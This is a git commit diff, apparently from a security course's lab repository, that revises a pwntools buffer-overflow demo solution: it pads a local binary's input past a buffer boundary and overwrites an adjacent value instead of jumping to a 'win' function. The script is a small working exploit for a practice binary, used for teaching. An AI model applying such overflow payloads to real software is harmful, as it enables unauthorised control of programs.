4305359a22533bc315bfef930b4c16e6054e96ba
Lachlan <lachlanwaugh8@gmail.com>
2022-06-14 23:11:29 +1000

    added solutions for week02 and week03 labs, fixed buffer_demo solution for week02 demo.

--- demos/buffer_overflow/buffer.py
+++ demos/buffer_overflow/buffer.py
@@ -1,12 +1,11 @@
 from pwn import *
 
-p = process('./buffer_prac')
-elf = ELF('./buffer_prac')
+p = process('./buffer_demo')
 
 payload = b'A' * (0x34 - 0xC)
-payload += p32(elf.symbols['win_better'])
+payload += b'1'
 
-p.sendlineafter(b'password', payload)
+p.sendline(payload)
 
 p.interactive()
 p.close()
